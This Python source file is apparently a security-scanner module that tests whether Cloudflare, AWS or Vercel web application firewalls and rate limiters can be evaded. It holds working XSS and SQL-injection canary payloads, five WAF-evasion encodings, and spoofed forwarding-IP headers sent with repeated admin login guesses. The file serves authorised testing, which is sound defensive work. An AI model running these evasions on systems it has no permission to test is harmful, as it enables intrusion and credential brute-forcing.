#!/usr/bin/env python3
"""
waf_evade.py v1.0 — Cloudflare / AWS WAF / Vercel Firewall & Rate-Limit Evasion Fuzzer.

Operates in Zero-Credential Black-Box Attacker Mode to test whether an attacker can bypass
edge WAF rules or application rate limiters using 6 real-world protocol mutations:
  1. 16KB Oversized Body Inspection-Limit Padding (bypasses AWS WAF 8KB/16KB & Cloudflare body limits)
  2. JSON Unicode Escape Obfuscation (`\\u003cscript\\u003e`, `\\u0027 OR 1=1--`)
  3. Content-Type Confusion (`text/plain` / `application/csp-report` carrying JSON payloads)
  4. HTTP Parameter Pollution (`?q=safe&q=<payload>`)
  5. Double URL Encoding & Inline Comment Splitting (`%253Cscript%253E`, `UNION/**/SELECT`)
  6. Spoofed Edge IP Header Rate-Limit Bypass (`X-Forwarded-For`, `CF-Connecting-IP`, `X-Vercel-Forwarded-For`)
"""
import argparse
import json
import os
import sys
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

RAW_CANARY_PAYLOAD = "<script>alert(1)</script>' UNION SELECT 1,2--"


class WAFEvade(VibeTool):
    def __init__(self):
        super().__init__(
            "WAF Evade",
            "Cloudflare / AWS WAF / Vercel Firewall & Rate-Limit Evasion Fuzzer",
        )

    def _is_blocked(self, status, body, hdrs):
        if status in (403, 406, 429, 503):
            return True
        if self.is_waf_challenge(status, body, hdrs):
            return True
        return False

    def run(self, url):
        self.banner()
        if "://" not in url:
            first_host = url.split("/")[0].split(":")[0].lower()
            url = f"{'http' if first_host in ('localhost', '127.0.0.1', '::1') else 'https'}://{url}"
        base = url.rstrip("/")
        self.log(f"Testing WAF & Rate-Limit Evasion on {base} (Zero-Key Attacker Mode)")

        # Pick an active endpoint to test POST/GET mutations
        target_ep = f"{base}/api/guestbook"
        st_probe, _, _ = self.safe_request(target_ep, method="GET")
        if st_probe in (0, 404):
            target_ep = f"{base}/"

        # Step 1: Send un-obfuscated canary payload to check if a WAF blocks raw attacks
        raw_st, raw_body, raw_hdrs = self.safe_request(
            target_ep,
            method="POST",
            data={"name": "test", "text": RAW_CANARY_PAYLOAD},
            headers={"Content-Type": "application/json"},
        )
        waf_active = self._is_blocked(raw_st, raw_body, raw_hdrs)
        if waf_active:
            self.log(
                f"Baseline raw canary payload BLOCKED by WAF on {target_ep} (HTTP {raw_st}). Testing 5 evasion mutations...",
                "info",
            )
        else:
            self.log(
                f"Baseline raw canary payload NOT blocked at edge on {target_ep} (HTTP {raw_st}) — no active WAF signature rule.",
                "warn",
            )

        # Step 2: Run 5 WAF Evasion Mutations
        padding_16k = "A" * 16_500
        evasion_vectors = [
            (
                "16kb_oversized_body_padding",
                "POST",
                target_ep,
                f'{{"pad":"{padding_16k}","name":"vibe","text":"{RAW_CANARY_PAYLOAD}"}}',
                {"Content-Type": "application/json"},
                "16KB body filler before payload to exceed WAF 8KB/16KB body inspection window",
            ),
            (
                "json_unicode_escape",
                "POST",
                target_ep,
                '{"name":"vibe","text":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\\u0027 UNION SELECT 1--"}',
                {"Content-Type": "application/json"},
                "JSON Unicode escape sequences decoded by backend JSON parser after passing WAF regex",
            ),
            (
                "content_type_confusion",
                "POST",
                target_ep,
                json.dumps({"name": "vibe", "text": RAW_CANARY_PAYLOAD}),
                {"Content-Type": "text/plain;charset=UTF-8"},
                "JSON payload sent with Content-Type: text/plain to skip WAF JSON body parser",
            ),
            (
                "http_parameter_pollution",
                "GET",
                f"{target_ep}?q=benign&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
                None,
                {},
                "Duplicate query parameter (?q=benign&q=<payload>) to confuse parameter inspection",
            ),
            (
                "double_encode_comment_split",
                "GET",
                f"{target_ep}?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E%27/**/UNION/**/SELECT/**/1--",
                None,
                {},
                "Double URL encoding + SQL inline comment token splitting",
            ),
        ]

        bypasses = 0
        for name, method, ep_url, payload, hdrs, desc in evasion_vectors:
            st, body, r_hdrs = self.safe_request(ep_url, method=method, data=payload, headers=hdrs)
            blocked = self._is_blocked(st, body, r_hdrs)
            if not blocked and 200 <= st < 400:
                if waf_active:
                    self.log(
                        f"WAF BYPASS: '{name}' evaded WAF block (baseline HTTP {raw_st} -> HTTP {st})!",
                        "crit",
                    )
                    self.record_finding(
                        title=f"Edge WAF Bypassed via {name}",
                        severity="high",
                        location=ep_url,
                        evidence=f"{desc} returned HTTP {st} while raw payload returned HTTP {raw_st}",
                        recommendation=(
                            "Increase WAF body inspection limit to >= 64KB (or reject bodies > 8KB on JSON routes), "
                            "normalize Unicode escapes before inspection, and strictly enforce Content-Type."
                        ),
                        cwe="CWE-693",
                        owasp="A05:2021 - Security Misconfiguration",
                    )
                    bypasses += 1
                elif RAW_CANARY_PAYLOAD[:15] in (body or "") or "<script>alert(1)</script>" in (body or ""):
                    self.log(
                        f"Payload reflected/stored via '{name}' on {ep_url} without WAF interception (HTTP {st})!",
                        "hack",
                    )
                    bypasses += 1

        # Step 3: Test IP Spoofing Rate-Limit Evasion
        self.log("Testing IP-Spoofing Rate-Limit Header Trust (X-Forwarded-For / CF-Connecting-IP / X-Vercel-Forwarded-For)...")
        rl_triggered = False
        for i in range(12):
            spoof_ip = f"198.51.100.{i + 10}"
            st, _, _ = self.safe_request(
                f"{base}/api/login",
                method="POST",
                data={"username": "admin", "password": f"wrong-{i}"},
                headers={
                    "Content-Type": "application/json",
                    "X-Forwarded-For": spoof_ip,
                    "X-Real-IP": spoof_ip,
                    "CF-Connecting-IP": spoof_ip,
                    "True-Client-IP": spoof_ip,
                    "X-Vercel-Forwarded-For": spoof_ip,
                },
            )
            if st == 429:
                rl_triggered = True
                break

        if not rl_triggered:
            self.log(
                "12 rapid auth probes with spoofed X-Forwarded-For/CF-Connecting-IP completed without HTTP 429.",
                "warn",
            )
        else:
            self.log("Rate limiter enforced HTTP 429 despite spoofed IP headers.", "pass")

        return 0


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="WAF Evade v1.0 - Cloudflare / AWS WAF / Vercel Firewall & Rate-Limit Evasion Fuzzer"
    )
    parser.add_argument("--url", "-t", "--target", dest="url", required=True, help="Target URL (e.g. https://my-app.vercel.app)")
    parser.add_argument("-v", "--version", action="version", version="WAF Evade 1.0.0")
    args = parser.parse_args(argv)
    return WAFEvade().run(args.url)


if __name__ == "__main__":
    sys.exit(main())
